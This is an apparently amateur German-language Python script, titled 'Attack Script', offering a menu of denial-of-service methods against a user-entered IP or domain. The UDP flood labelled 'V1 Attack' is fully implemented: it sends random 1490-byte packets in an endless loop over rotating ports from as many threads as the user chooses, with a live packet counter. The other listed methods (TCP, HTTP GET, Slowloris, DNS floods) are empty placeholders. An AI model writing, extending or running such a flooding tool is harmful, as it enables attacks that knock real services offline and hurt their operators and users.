import os
import random
import socket
import requests
import threading
import time

# Globale Variablen
packet_counter = 0  # Zähler für gesendete Pakete
stop_event = threading.Event()  # Ereignis zum Stoppen der Angriffe

# Funktion zum Setzen der Farben
def print_colored(text, color="pink", background="black"):
    color_codes = {
        "pink": "\033[38;5;13m",
        "red": "\033[38;5;9m",
        "blue": "\033[38;5;12m",
        "green": "\033[38;5;10m",
        "yellow": "\033[38;5;11m",
        "white": "\033[38;5;15m",
        "reset": "\033[0m"
    }
    background_codes = {
        "black": "\033[48;5;0m",
        "white": "\033[48;5;15m",
        "blue": "\033[48;5;19m",
        "red": "\033[48;5;1m",
        "reset": "\033[0m"
    }
    print(f"{background_codes[background]}{color_codes[color]}{text}{color_codes['reset']}{background_codes['reset']}")

# Funktion für Threads
def thread_attack(func, *args):
    thread = threading.Thread(target=func, args=args)
    thread.daemon = True
    thread.start()

# Funktion zum Anzeigen des Zählers
def show_statistics():
    while not stop_event.is_set():
        print_colored(f"Gesendete Pakete: {packet_counter}", color="green", background="black")
        time.sleep(1)  # Aktualisierung alle 1 Sekunde

# Angriffsmethoden
def v1_attack(ip, port):
    global packet_counter
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    while not stop_event.is_set():
        try:
            sock.sendto(bytes, (ip, port))
            packet_counter += 1
            port += 1
            if port > 65534:
                port = 1
        except:
            pass

# Weitere Methoden wie UDP Flood, HTTP GET Flood, usw. (siehe vorherigen Code)

# Hauptprogramm
if __name__ == "__main__":
    os.system("clear")
    os.system("figlet -f slant Attack Script")

    # Farben auswählen
    print_colored("Farbauswahl für Schrift und Hintergrund:", color="pink")
    print("1 - Pink (Standard), 2 - Rot, 3 - Blau, 4 - Grün, 5 - Gelb")
    color_choice = int(input("Wähle eine Schriftfarbe: "))
    bg_choice = int(input("Wähle eine Hintergrundfarbe (1-Schwarz, 2-Weiß, 3-Blau, 4-Rot): "))

    colors = ["pink", "red", "blue", "green", "yellow"]
    backgrounds = ["black", "white", "blue", "red"]
    color = colors[color_choice - 1] if color_choice in range(1, 6) else "pink"
    background = backgrounds[bg_choice - 1] if bg_choice in range(1, 5) else "black"

    # Angriffsoptionen anzeigen
    print_colored("Willkommen zum Angriffsskript!", color=color, background=background)
    print_colored("Bitte wählen Sie eine Angriffsmethode:", color=color, background=background)
    print("1 - V1 Attack (stabil und effektiv)")
    print("2 - UDP Flood\n3 - TCP Flood\n4 - HTTP GET Flood\n5 - Slowloris Attack\n6 - DNS Query Flood")
    
    # Benutzereingaben
    method = input("Wähle die Angriffsmethode (1-6): ")
    ip = input("Ziel-IP-Adresse (oder Domain): ")
    num_threads = int(input("Gib die Anzahl der Threads ein (z. B. 1000): "))
    port = int(input("Gib den Start-Port an (z. B. 80): "))

    # Zähler starten
    stats_thread = threading.Thread(target=show_statistics)
    stats_thread.daemon = True
    stats_thread.start()

    # Angriffsstart
    try:
        if method == "1":  # V1 Attack
            print_colored("Starte V1-Angriff...", color=color, background=background)
            for _ in range(num_threads):
                thread_attack(v1_attack, ip, port)

        elif method == "2":  # Andere Methoden einfügen (UDP, TCP, usw.)
            pass  # Siehe vorheriger Code für andere Methoden

    except KeyboardInterrupt:
        print_colored("\nAngriff gestoppt! Statistiken werden geschlossen.", color="yellow", background="black")
        stop_event.set()
